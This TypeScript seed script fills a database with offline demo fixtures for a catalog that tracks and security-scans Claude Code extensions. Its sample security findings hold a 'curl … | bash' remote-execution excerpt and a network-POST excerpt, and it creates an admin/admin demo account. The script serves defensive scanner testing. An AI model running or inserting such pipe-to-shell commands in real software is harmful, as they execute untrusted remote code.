// 로컬/CI 오프라인 픽스처: 저장소 10 · 항목 20 · 스타 60일 · 검사/Finding · 트렌드 · 데모 계정(admin/admin) 데이터.
// GitHub·AI 호출 없이 모든 화면이 채워지게 한다. 이미 있으면 통째로 건너뛴다(멱등).
// `ai` 요약은 kok_ai 롤로 실행한다 — NestJS(kok_app)는 ai에 쓸 수 없고, 쓰기 소유권 규칙을 픽스처도 지킨다.
//
// 실행: DATABASE_URL(kok_app) AI_DATABASE_URL(kok_ai) npx ts-node scripts/seed-demo-fixtures.ts
import { PrismaPg } from '@prisma/adapter-pg';
import {
  ItemKind,
  PrismaClient,
  RiskLevel,
  type Item,
  type Prisma,
  type Repo,
} from '@prisma/client';
import * as bcrypt from 'bcrypt';
import { createHash } from 'node:crypto';
import { Client } from 'pg';

const DAY_MS = 86_400_000;
const DAYS = 60;
const SKILL_TOOLS = [
  'R11_SKILL_UNRESTRICTED_TOOLS',
  'R13_UNPINNED_PACKAGE_EXEC',
];

const KINDS: ItemKind[] = ['HOOK', 'SKILL', 'PLUGIN'];
/** 항목 20개의 등급 분포: 4등급(SAFE·CAUTION·DANGER·분석 불가)을 섞는다. */
const LEVELS: (RiskLevel | 'UNSUPPORTED' | 'ERROR')[] = [
  'SAFE',
  'CAUTION',
  'SAFE',
  'DANGER',
  'SAFE',
  'CAUTION',
  'UNSUPPORTED',
  'SAFE',
  'CAUTION',
  'DANGER',
  'SAFE',
  'SAFE',
  'CAUTION',
  'ERROR',
  'SAFE',
  'DANGER',
  'SAFE',
  'CAUTION',
  'SAFE',
  'SAFE',
];
const FINDINGS = {
  DANGER: {
    ruleId: 'R01_REMOTE_PIPE_EXEC',
    file: 'scripts/install.sh',
    excerpt: 'curl -fsSL https://example.com/i.sh | bash',
  },
  CAUTION: {
    ruleId: 'R04_NETWORK_SEND',
    file: 'hooks/notify.sh',
    excerpt: 'curl -X POST https://hooks.example.com/notify',
  },
} as const;

const isoDay = (d: Date) => d.toISOString().slice(0, 10);
const sha = (s: string) => createHash('sha256').update(s).digest('hex');

export interface SeedDeps {
  prisma: PrismaClient;
  /** kok_ai 롤로 연결된 클라이언트. 없으면 ai 요약은 건너뛴다. */
  ai?: Client;
}

/** @returns 새로 넣었으면 true, 이미 있어 건너뛰었으면 false. */
export async function seedDemoFixtures({
  prisma,
  ai,
}: SeedDeps): Promise<boolean> {
  if (
    (await prisma.repo.count({
      where: { fullNameLower: { startsWith: 'demo-' } },
    })) > 0
  ) {
    return false;
  }
  const today = new Date(isoDay(new Date()));

  // ── 저장소 10 + 스타 60일 ──
  const repos: Repo[] = [];
  for (let r = 0; r < 10; r++) {
    const total0 = 50 + r * 120;
    const rows: Prisma.RepoStarDayCreateManyInput[] = [];
    const gains: (number | null)[] = [];
    let total = total0;
    let prevTotal: number | null = null;
    for (let d = DAYS - 1; d >= 0; d--) {
      const day = new Date(today.getTime() - d * DAY_MS);
      total += 1 + ((r * 7 + d * 3) % (4 + r)) + (d < 7 ? r : 0);
      // 저장소 3: 최근 3일 스냅샷 누락 → 차트에 "모름" 구간이 보이게
      const missing = r === 3 && d >= 2 && d <= 4;
      rows.push({
        repoId: 0, // 아래에서 채움
        day,
        snapshotTotal: missing ? null : total,
        // 저장소 5: 과거 구간은 공식 기록만(백필 직후 상태)
        officialAdded: r === 5 && d >= 8 ? 2 + (d % 3) : null,
      });
      gains.push(missing || prevTotal === null ? null : total - prevTotal);
      prevTotal = missing ? null : total;
    }
    const repo = await prisma.repo.create({
      data: {
        githubId: BigInt(9_000_001 + r),
        nodeId: `demo-node-${r}`,
        owner: `demo-owner-${r}`,
        name: `claude-${['hooks', 'skills', 'toolkit', 'plugins', 'agents'][r % 5]}-${r}`,
        fullNameLower: `demo-owner-${r}/claude-${['hooks', 'skills', 'toolkit', 'plugins', 'agents'][r % 5]}-${r}`,
        description: `데모 저장소 ${r} — Claude Code 확장 모음`,
        defaultBranch: 'main',
        headSha: sha(`head-${r}`).slice(0, 40),
        stars: total,
        pushedAt: new Date(today.getTime() - r * DAY_MS),
        ghCreatedAt: new Date(today.getTime() - (200 + r * 30) * DAY_MS),
        status: 'TRACKED',
        discoveredVia: 'AWESOME_SEED',
        topics: ['claude-code'],
        sparkline7d: gains.slice(-7),
        trackedSince: new Date(today.getTime() - 60 * DAY_MS),
      },
    });
    await prisma.repoStarDay.createMany({
      data: rows.map((x) => ({ ...x, repoId: repo.id })),
    });
    repos.push(repo);
  }

  // ── 항목 20 · 검사 · Finding ──
  const items: Item[] = [];
  for (let i = 0; i < 20; i++) {
    const repo = repos[i % 10];
    const kind = KINDS[i % 3];
    const state = LEVELS[i];
    const analyzed = state !== 'UNSUPPORTED' && state !== 'ERROR';
    const level = analyzed ? state : null;
    const item = await prisma.item.create({
      data: {
        repoId: repo.id,
        kind,
        path: `${kind.toLowerCase()}s/demo-${i}`,
        name: `demo-${kind.toLowerCase()}-${i}`,
        description: `${kind} 데모 항목 ${i}`,
        sourceType: state === 'UNSUPPORTED' ? 'UNSUPPORTED' : 'IN_REPO',
        components:
          kind === 'PLUGIN' ? { skills: 2, hooks: 1, mcpServers: 0 } : {},
        hasExternalMcp: kind === 'PLUGIN' && i % 2 === 0,
        currentLevel: level,
        levelChangedAt: level
          ? new Date(today.getTime() - (i % 5) * DAY_MS)
          : null,
        repoStars: repo.stars,
        repoPushedAt: repo.pushedAt!,
        firstSeenAt: new Date(today.getTime() - (30 - i) * DAY_MS),
      },
    });
    const scan = await prisma.securityScan.create({
      data: {
        itemId: item.id,
        headSha: repo.headSha!,
        ruleSetVersion: '1.0.0',
        status: analyzed
          ? 'ANALYZED'
          : state === 'UNSUPPORTED'
            ? 'UNSUPPORTED'
            : 'ERROR',
        rawLevel: level,
        level,
        findingCount: level === 'SAFE' || !analyzed ? 0 : 1,
      },
    });
    if (level === 'DANGER' || level === 'CAUTION') {
      const f = FINDINGS[level];
      await prisma.securityFinding.create({
        data: {
          scanId: scan.id,
          ruleId:
            kind === 'SKILL' && level === 'CAUTION' ? SKILL_TOOLS[0] : f.ruleId,
          severity: level,
          filePath: f.file,
          line: 3 + i,
          excerpt: f.excerpt,
          fingerprint: sha(`${item.id}:${f.ruleId}`),
        },
      });
    }
    await prisma.item.update({
      where: { id: item.id },
      data: { currentScanId: scan.id },
    });
    items.push(item);
  }

  // ── 트렌드: 저장소 8개 자격(2개 미자격), 3개 기간 ──
  const ranked = repos.slice(0, 8);
  for (const window of ['D1', 'D7', 'D30'] as const) {
    await prisma.trendScore.createMany({
      data: ranked.map((repo, idx) => ({
        window,
        asOf: today,
        repoId: repo.id,
        score:
          Math.round((1200 - idx * 130 + (window === 'D1' ? 40 : 0)) * 100) /
          100,
        gain: 60 - idx * 6,
        acceleration: 1 + (7 - idx) / 8,
        spikePenalty: idx === 2 ? 0.7 : 1,
        rank: idx + 1,
        prevRank: idx === 4 ? null : ((idx + 2) % 8) + 1, // 저장소 4 = NEW
        paramsVersion: 1,
      })),
    });
  }
  for (const [idx, repo] of ranked.entries()) {
    const score = 1200 - idx * 130;
    await prisma.item.updateMany({
      where: { repoId: repo.id },
      data: {
        trendScore7d: score,
        trendRank7d: idx + 1,
        prevTrendRank7d: idx === 4 ? null : ((idx + 2) % 8) + 1,
      },
    });
  }

  // ── 마켓플레이스 1개 ──
  const plugin = items.find((i) => i.kind === 'PLUGIN')!;
  const mp = await prisma.marketplace.create({
    data: {
      repoId: plugin.repoId,
      path: '',
      name: 'demo-marketplace',
      pluginCount: 1,
    },
  });
  await prisma.marketplaceEntry.create({
    data: {
      marketplaceId: mp.id,
      entryName: plugin.name,
      itemId: plugin.id,
      rawSource: { source: './' },
    },
  });

  // ── 관리자 화면용: 수집 실행 1건 · 열린 이슈 1건 ──
  const run = await prisma.ingestionRun.create({
    data: {
      trigger: 'CRON',
      asOf: today,
      cronKey: isoDay(today),
      status: 'PARTIAL',
      startedAt: new Date(today.getTime() + 18 * 3_600_000),
      finishedAt: new Date(today.getTime() + 18 * 3_600_000 + 540_000),
    },
  });
  await prisma.ingestionStage.createMany({
    data: [
      {
        runId: run.id,
        stage: 'DISCOVER',
        status: 'DONE',
        stats: { processed: 10, ghSearchUsed: 12, ghCodeSearchUsed: 4 },
      },
      {
        runId: run.id,
        stage: 'SNAPSHOT',
        status: 'DONE',
        stats: { processed: 10, ghCoreUsed: 3 },
      },
      {
        runId: run.id,
        stage: 'AI_SYNC',
        status: 'PAUSED',
        stats: { processed: 14 },
        error: '일일 예산 소진',
      },
    ],
  });
  await prisma.ingestionFailure.create({
    data: {
      runId: run.id,
      stage: 'SNAPSHOT',
      repoId: repos[3].id,
      code: 'GH_404',
      message: '저장소를 찾을 수 없음(데모)',
    },
  });
  await prisma.dataQualityIssue.create({
    data: {
      kind: 'STAR_SOURCE_MISMATCH',
      repoId: repos[5].id,
      windowStart: new Date(today.getTime() - 7 * DAY_MS),
      windowEnd: today,
      values: { snapshot: 41, official: 25, tolerance: 7 },
      diff: 16,
      detectedRunId: run.id,
    },
  });

  // ── 데모 계정 admin/admin + 북마크 ──
  const admin = await prisma.user.upsert({
    where: { email: 'admin' },
    update: {},
    create: {
      email: 'admin',
      name: '데모 관리자',
      role: 'ADMIN',
      passwordHash: await bcrypt.hash('admin', 10),
    },
  });
  const marked = [items[0], items[3], items[9]];
  await prisma.bookmark.createMany({
    data: marked.map((it) => ({
      userId: admin.id,
      itemId: it.id,
      // 하나는 저장 후 등급이 바뀐 상태 → "보안 등급 변경" 탭이 비지 않게
      seenLevel: it.id === items[3].id ? 'SAFE' : it.currentLevel,
    })),
    skipDuplicates: true,
  });

  // ── ai 요약(kok_ai 롤): 대부분 OK, 일부 정보 부족 ──
  if (ai) {
    for (const [i, it] of items.entries()) {
      if (i % 7 === 6) continue; // 요약 대기 상태도 남긴다
      const insufficient = i % 5 === 4;
      await ai.query(
        `INSERT INTO ai.item_summary
           (item_id, source_sha256, prompt_version, model, status, summary_ko, use_cases_ko, install_commands, requirements_ko)
         VALUES ($1, $2, 1, 'fixture', $3, $4, $5::jsonb, $6::jsonb, $7::jsonb)
         ON CONFLICT (item_id) DO NOTHING`,
        [
          it.id,
          sha(`doc-${it.id}`),
          insufficient ? 'INSUFFICIENT' : 'OK',
          insufficient
            ? null
            : `${it.name}은(는) Claude Code에서 반복 작업을 자동화해 주는 ${it.kind} 입니다.`,
          JSON.stringify(
            insufficient
              ? []
              : ['PR 올리기 전에 린트 실행', '커밋 메시지 규칙 검사'],
          ),
          JSON.stringify(
            insufficient
              ? []
              : [{ command: `/plugin install ${it.name}@demo-marketplace` }],
          ),
          JSON.stringify(insufficient ? [] : ['Node.js 20+']),
        ],
      );
    }
  }
  return true;
}

async function main() {
  const prisma = new PrismaClient({
    adapter: new PrismaPg(process.env.DATABASE_URL as string),
  });
  const ai = process.env.AI_DATABASE_URL
    ? new Client({ connectionString: process.env.AI_DATABASE_URL })
    : undefined;
  await ai?.connect();
  try {
    const seeded = await seedDemoFixtures({ prisma, ai });
    console.log(seeded ? '데모 픽스처를 넣었습니다.' : '이미 있어 건너뜁니다.');
  } finally {
    await ai?.end();
    await prisma.$disconnect();
  }
}

if (require.main === module) {
  void main();
}
